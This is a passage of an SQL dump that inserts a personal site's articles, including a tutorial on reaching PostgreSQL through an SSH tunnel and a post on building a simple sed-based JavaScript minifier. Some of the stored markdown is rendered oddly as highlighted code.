\c themetacity;
SET ROLE com_admin;
INSERT INTO com.articles (id,title,url,"type","text",creation_date,update_date,blurb,parent_id) VALUES
	 (19,'InfoVis and the digital world','infovis-and-the-digital-world','workshop','<p>What can we do with InfoVis these days?</p>','2018-12-22 21:36:54','2018-12-09 21:36:54.974974','<p>Exploring Information Visualisation in the digital space</p>',NULL),
	 (1,'Access PostgreSQL via SSH tunnel','access-postgresql-via-ssh-tunnel','blog','<p>As part of my security policy, PostgreSQL (psql) doesn''t allow outside connections. While this provides a lesser attack surface area, it does make running queries much more convoluted. Typical work flow uses something like this:</p>
<ol>
<li>Write article, workshop entry, change in schema etc</li>
<li>Write new entry SQL command around said article</li>
<li>Run the command using the local installation of psql</li>
<li>Identify and make changes</li>
<li>GOTO step 1 until all changes needed are done</li>
<li>SCP the file to the server</li>
<li>SSH to the server (probably already have open in another window)</li>
<li>Run the command using the server installation of psql</li>
<li>Go to the local installation of psgq and reset the db ready for the next article</li>
</ol>
<p>Now if I discover that I need to make a change (spelling usually or not closing tags) on the server version, it is usually easier to <code>UPDATE</code> than <code>INSERT</code> new changes.</p>
<ol>
<li>Make updates by manually adding the ''contenteditable'' attribute to the whole article; this shows what changes will look like in real time</li>
<li>Write changes to a new file</li>
<li>Write new entry SQL <code>UPDATE</code> command around said article the file to the server</li>
<li>SSH to the server (probably already have open in another window)</li>
<li>Run the command using the server installation of psql</li>
</ol>
<p>Another option is to:</p>
<ol>
<li>Make updates by manually adding the ''contenteditable'' attribute to the whole article</li>
<li>Write changes to a new file</li>
<li>Write new entry SQL <code>UPDATE</code> command around said article</li>
<li>SSH to the server (probably already have open in another window)</li>
<li>Connect to the psql install and then to the db <code>psql -U username dbname</code></li>
<li>Run the command by copying the local file contents into the server window psql prompt</li>
</ol>
<p>Either way, not very efficient. What is more efficient is being able to use an SSH connetion to transparently open a path the server psql that the local one can use with SSH protection around the whole thing. An SSH tunnel. The easiest way to do this is: ''<code>ssh -N -L 5555:localhost:5432 server</code>''.</p>
<p>Buuuut...couldn''t you just whitelist your ip adress on the server? What if you don''t have permission to do so, or you move around a lot or just don''t want any external interface to your database/whatever.</p>
<p>The trick to understanding these tunnels is to read from the outside in. Let''s do that now:</p>
<ol>
<li>''<code>ssh ... server</code>'' Connect to server</li>
<li>''<code>-N</code>'' Don''t connect a command prompt: we don''t want to do anything directly</li>
<li>''<code>-L 555:localhost:5432</code>'' This is the meat of the operation and is discussed below</li>
</ol>
<p>The general idea is to use the established connection to transparently forward ports from one computer, computer through the ssh connection to the port on the other computer. It can get (much) more complicated than that but for our purposes today let''s leave it at that.</p>
<p>Specifically in our connection the following happens: forward any connection to port 5555 through the ssh tunnel to (and this is the trick) what is now (since we are now on the server) the (remote remember) severs version of localhost port 5432. Once you understand that, most tunnels make much more sense. That idea is so important I will say it again: that ''localhost'' is the remote connection''s version of localhost not the local version. Renaming might clear up any stragglers: ''<code>ssh -N -L 5555:remoteserversversionoflocalhost:5432 remoteserver</code>''</p>
<p>Check <code>man ssh</code> for better technical description as to what is happening.</p>
<p>In practice this is a great way to send commands to pg (5432 is the default port) on a server that does not allow remote connection directly to pg, but you do have SSH access to.</p>
<p>N.B. There is one more thing to watch out for, PostgreSQL specific: by default psql tries to connect over a Unix socket which tunneling (AFAIK) can''t handle. To get around this you need to tell psql to use a TCP connection by adding in the ''<code>-h localhost</code>'' flag which defaults to TCP connections. That <code>-h</code> is the <code>remoteserversversionoflocalhost</code> remember.</p>
<p>In action: ''<code>ssh -N -L 5555:localhost:5432 server</code>''. You will end up (after authenticating) with a terminal window that looks like it is waiting to return; it will not. You could run it in the background if you wanted to establish a more permanent, out of the way connection by ameding ''<code>-f</code>'' and ''<code>&amp;</code>'' (''<code>ssh -f -N -L 5555:localhost:5432 server &amp;</code>'')d. In another window send the command you want (or connect via pgAdmin3 etc): ''<code>psql -h localhost -U username -p 5555 &lt; commandtorun.sql</code>''. If everything has gone well, your command will automagically just run like the machine was sitting next to you.</p>','2013-09-04 22:15:12','2013-09-04 22:15:12','<p>How I access PostgreSQL when it only listens to the server it is running on.</p>',NULL),
	 (2,'Lets make a terrible JS minifier: Part 1','lets-make-a-terrible-js-minifier-part-1','blog','<p>Minifying JavaScript is a pretty handy thing to do: it reduces http requests, total download size and so makes peoples experience of your site better.</p>
<p>So let''s write a script to do some minifying for us.</p>
<p>First we need some JS to minify: lets use he files running on this site. For this example we will be looking at what we can do to make the files small and how we can combine them to reduce http requests.</p>
<p>The files in question can [be found on GitHub][ghTMC] as the ones on this site have already been minified and so are incomprehensible.</p>
<p>The general approach we are taking today: reducing variable and function names to the smallest possible size (saves on bandwidth, and the interpretor doesn''t care anyway), remove all extraneous formatting (the JS processor does not care about readability) and mash all the files together (saves on https requests).</p>
<p>The order we do these operations to the file can be important, and I will point out where you should look if something were to come up. The first pass I am going to take on the files is a pretty naive one but gets the job done (somewhat) and then we will move on to something a bit more appropriate.</p>
<p>The first file in question is the one that drives the search [on the workshop page (searcher.js)][ghSearcher.js].</p>
<p>```\{\}javascript
$(document).ready\(function \(\) \{
    "use strict";
    var $noResults, $searchBox, $entries, searchTimeout, firstRun, loc, hist, win;
    $noResults = $(''#noresults'');
    $searchBox = $(''#searchinput'');
    $entries = $(''#workshopBlurbEntries'');
    searchTimeout = null;
    firstRun = true;
    loc = location;
    hist = history;
    win = window;</p>
<div class="codehilite"><pre><span></span><span class="n">function</span> <span class="n">reset</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hist</span><span class="o">.</span><span class="n">state</span> <span class="o">!==</span> <span class="n">undefined</span><span class="p">)</span> <span class="p">{</span>  <span class="o">//</span> <span class="n">Avoid</span> <span class="n">infinite</span> <span class="n">loops</span>
        <span class="n">hist</span><span class="o">.</span><span class="n">pushState</span><span class="p">({</span><span class="s2">&quot;tag&quot;</span><span class="p">:</span> <span class="n">undefined</span><span class="p">},</span> <span class="s2">&quot;theMetaCity - Workshop&quot;</span><span class="p">,</span> <span class="s2">&quot;/workshop/&quot;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="o">$</span><span class="n">noResults</span><span class="o">.</span><span class="n">hide</span><span class="p">();</span>
    <span class="o">$</span><span class="n">entries</span><span class="o">.</span><span class="n">fadeOut</span><span class="p">(</span><span class="mi">150</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="o">$</span><span class="p">(</span><span class="s1">&#39;header ul li&#39;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">removeClass</span><span class="p">(</span><span class="s1">&#39;searchMatchTag&#39;</span><span class="p">);</span>
        <span class="o">$</span><span class="p">(</span><span class="s1">&#39;header h1 a span&#39;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">removeClass</span><span class="p">(</span><span class="s1">&#39;searchMatchTitle&#39;</span><span class="p">);</span>  <span class="o">//</span> <span class="n">The</span> <span class="n">span</span> <span class="n">remains</span> <span class="n">but</span> <span class="n">it</span> <span class="k">is</span> <span class="n">destroyed</span> <span class="n">when</span> <span class="n">filtering</span> <span class="n">using</span> <span class="n">the</span> <span class="n">text</span><span class="p">()</span> <span class="n">function</span>
        <span class="o">$</span><span class="p">(</span><span class="s2">&quot;.workshopentry&quot;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">show</span><span class="p">();</span>
    <span class="p">});</span>
    <span class="o">$</span><span class="n">entries</span><span class="o">.</span><span class="n">fadeIn</span><span class="p">(</span><span class="mi">150</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">function</span> <span class="n">filter</span><span class="p">(</span><span class="n">searchTerm</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">searchTerm</span> <span class="o">===</span> <span class="n">undefined</span><span class="p">)</span> <span class="p">{</span>  <span class="o">//</span> <span class="n">Only</span> <span class="n">history</span> <span class="n">api</span> <span class="n">should</span> <span class="n">push</span> <span class="n">undefined</span> <span class="n">to</span> <span class="n">this</span><span class="p">,</span> <span class="n">explicitly</span> <span class="n">taken</span> <span class="n">care</span> <span class="n">of</span> <span class="n">otherwise</span>
        <span class="n">reset</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">var</span> <span class="n">rePattern</span> <span class="o">=</span> <span class="n">searchTerm</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="o">/</span><span class="p">[</span><span class="o">.</span><span class="err">?</span><span class="o">*+^$</span>\<span class="p">[</span>\<span class="p">]</span>\\<span class="p">(){}</span><span class="o">|</span><span class="p">]</span><span class="o">/</span><span class="n">g</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">$&amp;&quot;</span><span class="p">),</span> <span class="n">searchPattern</span> <span class="o">=</span> <span class="n">new</span> <span class="n">RegExp</span><span class="p">(</span><span class="s1">&#39;(&#39;</span> <span class="o">+</span> <span class="n">rePattern</span> <span class="o">+</span> <span class="s1">&#39;)&#39;</span><span class="p">,</span> <span class="s1">&#39;ig&#39;</span><span class="p">);</span>  <span class="o">//</span> <span class="n">The</span> <span class="n">brackets</span> <span class="n">add</span> <span class="n">a</span> <span class="n">capture</span> <span class="n">group</span>

        <span class="o">$</span><span class="n">entries</span><span class="o">.</span><span class="n">fadeOut</span><span class="p">(</span><span class="mi">150</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="o">$</span><span class="n">noResults</span><span class="o">.</span><span class="n">hide</span><span class="p">();</span>

            <span class="o">$</span><span class="p">(</span><span class="s1">&#39;header&#39;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">parent</span><span class="p">()</span><span class="o">.</span><span class="n">hide</span><span class="p">();</span>

                <span class="o">//</span> <span class="n">Clear</span> <span class="n">results</span> <span class="n">of</span> <span class="n">previous</span> <span class="n">search</span>
                <span class="o">$</span><span class="p">(</span><span class="s1">&#39;li&#39;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">removeClass</span><span class="p">(</span><span class="s1">&#39;searchMatchTag&#39;</span><span class="p">);</span>

                <span class="o">//</span> <span class="n">Check</span> <span class="n">the</span> <span class="n">title</span>
                <span class="o">$</span><span class="p">(</span><span class="s1">&#39;h1&#39;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                    <span class="k">var</span> <span class="n">textToCheck</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">();</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">textToCheck</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="n">searchPattern</span><span class="p">))</span> <span class="p">{</span>
                        <span class="n">textToCheck</span> <span class="o">=</span> <span class="n">textToCheck</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">searchPattern</span><span class="p">,</span> <span class="s1">&#39;&lt;span class=&quot;searchMatchTitle&quot;&gt;$1&lt;/span&gt;&#39;</span><span class="p">);</span>  <span class="o">//</span><span class="n">capture</span> <span class="n">group</span> <span class="p">(</span><span class="o">$</span><span class="mi">1</span><span class="p">)</span> <span class="n">used</span> <span class="n">so</span> <span class="n">that</span> <span class="n">the</span> <span class="n">replacement</span> <span class="n">matches</span> <span class="n">the</span> <span class="n">case</span> <span class="ow">and</span> <span class="n">you</span> <span class="n">don</span><span class="s1">&#39;t get weird capitolisations</span>
                        <span class="o">$</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">html</span><span class="p">(</span><span class="n">textToCheck</span><span class="p">);</span>
                        <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">closest</span><span class="p">(</span><span class="s1">&#39;.workshopentry&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">show</span><span class="p">();</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="o">$</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">html</span><span class="p">(</span><span class="n">textToCheck</span><span class="p">);</span>
                    <span class="p">}</span>
                <span class="p">});</span>

                <span class="o">//</span> <span class="n">Check</span> <span class="n">the</span> <span class="n">tags</span>
                <span class="o">$</span><span class="p">(</span><span class="s1">&#39;li&#39;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">()</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="n">searchPattern</span><span class="p">))</span> <span class="p">{</span>
                        <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">addClass</span><span class="p">(</span><span class="s1">&#39;searchMatchTag&#39;</span><span class="p">);</span>
                        <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">closest</span><span class="p">(</span><span class="s1">&#39;.workshopentry&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">show</span><span class="p">();</span>
                    <span class="p">}</span>
                <span class="p">});</span>
            <span class="p">});</span>

            <span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="p">(</span><span class="s1">&#39;.workshopentry[style*=&quot;block&quot;]&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">length</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="o">$</span><span class="n">noResults</span><span class="o">.</span><span class="n">show</span><span class="p">();</span>
            <span class="p">}</span>

            <span class="o">$</span><span class="n">entries</span><span class="o">.</span><span class="n">fadeIn</span><span class="p">(</span><span class="mi">150</span><span class="p">);</span>
        <span class="p">});</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="o">$</span><span class="p">(</span><span class="s1">&#39;header ul li a&#39;</span><span class="p">,</span> <span class="o">$</span><span class="n">entries</span><span class="p">)</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="n">hist</span><span class="o">.</span><span class="n">pushState</span><span class="p">({</span><span class="s2">&quot;tag&quot;</span><span class="p">:</span> <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">()},</span> <span class="s2">&quot;theMetaCity - Workshop - &quot;</span> <span class="o">+</span> <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">(),</span> <span class="s2">&quot;/workshop/tag/&quot;</span> <span class="o">+</span> <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">());</span>
    <span class="o">$</span><span class="n">searchBox</span><span class="o">.</span><span class="n">val</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
    <span class="n">filter</span><span class="p">(</span><span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">());</span>
    <span class="k">return</span> <span class="bp">false</span><span class="p">;</span>  <span class="o">//</span> <span class="n">Using</span> <span class="n">the</span> <span class="n">history</span> <span class="n">API</span> <span class="n">so</span> <span class="n">no</span> <span class="n">page</span> <span class="n">reloads</span><span class="o">/</span><span class="n">changes</span>
<span class="p">});</span>

<span class="o">$</span><span class="n">searchBox</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s1">&#39;keyup&#39;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="n">clearTimeout</span><span class="p">(</span><span class="n">searchTimeout</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">val</span><span class="p">()</span><span class="o">.</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">searchTimeout</span> <span class="o">=</span> <span class="n">setTimeout</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="k">var</span> <span class="n">searchVal</span> <span class="o">=</span> <span class="o">$</span><span class="n">searchBox</span><span class="o">.</span><span class="n">val</span><span class="p">();</span>
            <span class="n">hist</span><span class="o">.</span><span class="n">pushState</span><span class="p">({</span><span class="s2">&quot;tag&quot;</span><span class="p">:</span> <span class="n">searchVal</span><span class="p">},</span> <span class="s2">&quot;theMetaCity - Workshop - &quot;</span> <span class="o">+</span> <span class="n">searchVal</span><span class="p">,</span> <span class="s2">&quot;/workshop/tag/&quot;</span> <span class="o">+</span> <span class="n">searchVal</span><span class="p">);</span>
            <span class="n">filter</span><span class="p">(</span><span class="n">searchVal</span><span class="p">);</span>
        <span class="p">},</span> <span class="mi">500</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">val</span><span class="p">()</span><span class="o">.</span><span class="n">length</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">searchTimeout</span> <span class="o">=</span> <span class="n">setTimeout</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">reset</span><span class="p">();</span>
        <span class="p">},</span> <span class="mi">500</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">});</span>

<span class="o">$</span><span class="p">(</span><span class="s1">&#39;#reset&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="o">$</span><span class="n">searchBox</span><span class="o">.</span><span class="n">val</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
    <span class="n">reset</span><span class="p">();</span>
<span class="p">});</span>

<span class="n">win</span><span class="o">.</span><span class="n">addEventListener</span><span class="p">(</span><span class="s2">&quot;popstate&quot;</span><span class="p">,</span> <span class="n">function</span> <span class="p">(</span><span class="n">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">console</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">hist</span><span class="o">.</span><span class="n">state</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">state</span> <span class="o">===</span> <span class="nb nb-Type">null</span><span class="p">)</span> <span class="p">{</span> <span class="o">//</span> <span class="n">Start</span> <span class="n">of</span> <span class="n">history</span> <span class="n">chain</span> <span class="n">on</span> <span class="n">this</span> <span class="n">page</span><span class="p">,</span> <span class="n">direct</span> <span class="n">entry</span> <span class="n">to</span> <span class="n">page</span> <span class="n">handled</span> <span class="n">by</span> <span class="n">firstRun</span><span class="p">)</span>
        <span class="n">reset</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">state</span><span class="o">.</span><span class="n">tag</span> <span class="o">!==</span> <span class="n">undefined</span><span class="p">)</span> <span class="p">{</span>
            <span class="o">$</span><span class="n">searchBox</span><span class="o">.</span><span class="n">val</span><span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">state</span><span class="o">.</span><span class="n">tag</span><span class="p">);</span>
            <span class="n">filter</span><span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">state</span><span class="o">.</span><span class="n">tag</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">});</span>

<span class="o">$</span><span class="n">noResults</span><span class="o">.</span><span class="n">hide</span><span class="p">();</span>

<span class="k">if</span> <span class="p">(</span><span class="n">firstRun</span><span class="p">)</span> <span class="p">{</span>                               <span class="o">//</span> <span class="mi">0</span>     <span class="mi">1</span>     <span class="mi">2</span>        <span class="mi">3</span>      <span class="mi">4</span> <span class="p">(</span><span class="k">if</span> <span class="o">/</span> <span class="n">present</span><span class="p">)</span>
    <span class="k">var</span> <span class="n">locArray</span> <span class="o">=</span> <span class="n">loc</span><span class="o">.</span><span class="n">pathname</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>   <span class="o">//</span> <span class="s1">&#39;/workshop/tag/searchString/</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">locArray</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;tag&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">locArray</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">!==</span> <span class="n">undefined</span><span class="p">)</span> <span class="p">{</span>    <span class="o">//</span> <span class="n">Check</span> <span class="k">for</span> <span class="n">direct</span> <span class="n">link</span> <span class="n">to</span> <span class="n">tag</span> <span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">e</span><span class="o">.</span> <span class="k">if</span> <span class="n">something</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="n">search</span> <span class="k">for</span> <span class="n">it</span><span class="p">)</span>
        <span class="n">hist</span><span class="o">.</span><span class="n">pushState</span><span class="p">({</span><span class="s2">&quot;tag&quot;</span><span class="p">:</span> <span class="n">locArray</span><span class="p">[</span><span class="mi">3</span><span class="p">]},</span> <span class="s2">&quot;theMetaCity - Workshop - &quot;</span> <span class="o">+</span> <span class="n">locArray</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="s2">&quot;/workshop/tag/&quot;</span> <span class="o">+</span> <span class="n">locArray</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
        <span class="n">filter</span><span class="p">(</span><span class="n">locArray</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">locArray</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>   <span class="o">//</span> <span class="n">Root</span> <span class="n">page</span> <span class="ow">and</span> <span class="n">really</span> <span class="n">shouldn</span><span class="s1">&#39;t do anything</span>
        <span class="o">//</span><span class="n">hist</span><span class="o">.</span><span class="n">pushState</span><span class="p">({</span><span class="s2">&quot;tag&quot;</span><span class="p">:</span> <span class="n">undefined</span><span class="p">},</span> <span class="s2">&quot;theMetaCity - Workshop&quot;</span><span class="p">,</span> <span class="s2">&quot;/workshop/&quot;</span><span class="p">);</span>
    <span class="p">}</span>   <span class="o">//</span> <span class="n">locArray</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">===</span> <span class="n">somepagenum</span> <span class="k">is</span> <span class="n">an</span> <span class="n">actual</span> <span class="n">page</span> <span class="ow">and</span> <span class="n">what</span> <span class="n">should</span> <span class="n">be</span> <span class="n">allowed</span> <span class="n">to</span> <span class="n">happen</span> <span class="n">by</span> <span class="n">itself</span>

    <span class="n">firstRun</span> <span class="o">=</span> <span class="bp">false</span><span class="p">;</span>
    <span class="o">//</span> <span class="n">Save</span> <span class="n">state</span> <span class="n">on</span> <span class="n">first</span> <span class="n">page</span> <span class="nb">load</span>
<span class="p">}</span>
</pre></div>


<p>});</p>
<div class="codehilite"><pre><span></span><span class="n">As</span> <span class="n">you</span> <span class="n">can</span> <span class="n">see</span><span class="p">,</span> <span class="n">a</span> <span class="n">horrible</span> <span class="n">mix</span> <span class="n">of</span> <span class="n">jQuery</span> <span class="ow">and</span> <span class="n">vanilla</span> <span class="n">JS</span> <span class="ow">and</span> <span class="n">terrible</span> <span class="n">clunky</span> <span class="n">junk</span> <span class="n">with</span> <span class="n">plenty</span> <span class="n">of</span> <span class="n">bugs</span><span class="o">.</span> <span class="n">So</span> <span class="n">let</span><span class="s1">&#39;s start stripping out things we do not need. First up is the variable and function names which can be shortened to individual letters to save on bytes during transmission.</span>
</pre></div>


<p>:::bash</p>
<h1 id="minify-the-variable-names">Minify the variable names.</h1>
<h1 id="each-script-is-put-in-its-own-function-scope-so-other-scripts-should-in-theory-have-no-problems-with-this">Each script is put in its own function scope so other scripts should (in theory) have no problems with this</h1>
<p>cat searcher.js &gt; temp
sed -i ''s/$noResults\b/z/g'' temp
sed -i ''s/$searchBox\b/y/g'' temp
sed -i ''s/$entries\b/x/g'' temp
sed -i ''s/searchTimeout\b/w/g'' temp
sed -i ''s/firstRun\b/v/g'' temp
sed -i ''s/loc\b/u/g'' temp
sed -i ''s/hist\b/t/g'' temp
sed -i ''s/win\b/s/g'' temp
sed -i ''s/textToCheck\b/r/g'' temp
sed -i ''s/searchPattern\b/q/g'' temp
sed -i ''s/address\b/p/g'' temp
sed -i ''s/searchString\b/o/g'' temp
sed -i ''s/searchTerm\b/n/g'' temp</p>
<h1 id="function-names">Function names</h1>
<p>sed -i ''s/filter(/m(/g'' temp
sed -i ''s/reset(/l(/g'' temp</p>
<h1 id="copy-over-ready-for-the-next-stage-of-processing">Copy over ready for the next stage of processing</h1>
<p>cat temp &gt; tmcscripts.js</p>
<div class="codehilite"><pre><span></span><span class="n">The</span> <span class="n">actual</span> <span class="k">process</span> <span class="k">is</span> <span class="n">pretty</span> <span class="n">straight</span> <span class="n">forward</span><span class="o">:</span> <span class="n">edit</span> <span class="k">in</span> <span class="n">place</span> <span class="p">(</span><span class="n n-Quoted">`-i`</span><span class="p">)</span> <span class="n">the</span> <span class="k">file</span> <span class="p">(</span><span class="k">in</span> <span class="n">temp</span> <span class="k">for</span> <span class="n">reasons</span> <span class="n">explained</span> <span class="n">later</span><span class="p">)</span> <span class="n">searching</span> <span class="k">and</span> <span class="n">replacing</span> <span class="k">each</span> <span class="k">instance</span> <span class="k">of</span> <span class="n">the</span> <span class="n">variable</span> <span class="k">and</span> <span class="k">function</span> <span class="k">names</span><span class="p">.</span> <span class="n">Started</span> <span class="k">at</span> <span class="n n-Quoted">`z`</span> <span class="k">and</span> <span class="n">worked</span> <span class="n">backwards</span> <span class="k">to</span> <span class="n">try</span> <span class="k">to</span> <span class="n">avoid</span> <span class="n">collisions</span> <span class="k">with</span> <span class="n n-Quoted">`i`</span> <span class="k">and</span> <span class="n">other</span> <span class="n">counters</span> <span class="p">(</span><span class="n">although</span> <span class="n">there</span> <span class="n">are</span> <span class="k">none</span> <span class="k">in</span> <span class="n">this</span> <span class="k">file</span><span class="p">).</span> <span class="n">Although</span> <span class="n">this</span> <span class="n">works</span> <span class="n">pretty</span> <span class="n">well</span> <span class="n">it</span> <span class="k">is</span> <span class="n">still</span> <span class="n">kind</span> <span class="k">of</span> <span class="n">naive</span> <span class="k">and</span> <span class="n">prone</span> <span class="k">to</span> <span class="k">error</span><span class="p">.</span> <span class="n">What</span> <span class="n">happens</span> <span class="k">if</span> <span class="n">there</span> <span class="k">is</span> <span class="n">a</span> <span class="k">string</span> <span class="k">and</span> <span class="n">variable</span> <span class="k">string</span> <span class="n">the</span> <span class="n">same</span> <span class="k">name</span><span class="p">,</span> <span class="k">or</span> <span class="k">get</span> <span class="n">the</span> <span class="n">regex</span> <span class="n">just</span> <span class="n">slightly</span> <span class="n">wrong</span><span class="nv">?</span> <span class="n">A</span> <span class="n">much</span> <span class="n">better</span> <span class="n">solution</span> <span class="k">is</span> <span class="k">to</span> <span class="k">use</span> <span class="n">an</span> <span class="n">abstract</span> <span class="n">syntax</span> <span class="n">tree</span> <span class="k">to</span> <span class="n">parse</span> <span class="n">the</span> <span class="k">file</span> <span class="k">and</span> <span class="k">replace</span> <span class="n">symbols</span> <span class="n">that</span> <span class="n">way</span><span class="p">.</span> <span class="k">One</span> <span class="n">such</span> <span class="k">exists</span><span class="o">:</span> <span class="err">[</span><span class="n">tool</span> <span class="k">for</span> <span class="n">this</span> <span class="k">is</span> <span class="n">graspjs</span><span class="p">.</span><span class="n">com</span><span class="err">][</span><span class="n">grasp</span><span class="err">]</span><span class="p">.</span>
</pre></div>


<p>:::bash</p>
<h1 id="minify-the-variable-names_1">Minify the variable names.</h1>
<h1 id="each-script-is-put-in-its-own-function-scope-so-other-scripts-should-in-theory-have-no-problems-with-this_1">Each script is put in its own function scope so other scripts should (in theory) have no problems with this</h1>
<p>cat searcher.js &gt; temp.js
grasp -i ''#$noResults'' -R z temp.js
grasp -i ''#$searchBox'' -R y temp.js
grasp -i ''#$entries'' -R x temp.js
grasp -i ''#searchTimeout'' -R w temp.js
grasp -i ''#firstRun'' -R v temp.js
grasp -i ''#loc'' -R u temp.js
grasp -i ''#hist'' -R t temp.js
grasp -i ''#win'' -R s temp.js
grasp -i ''#searchTerm'' -R r temp.js
grasp -i ''#rePattern'' -R q temp.js
grasp -i ''#searchPattern'' -R p temp.js
grasp -i ''#textToCheck'' -R o temp.js
sed -i ''s/searchVal\b/n/g'' temp.js  # current bug with grasp where it cant parse 3 or more variables on the same line</p>
<h1 id="function-names_1">Function names</h1>
<p>grasp -i ''#filter'' -R m temp.js
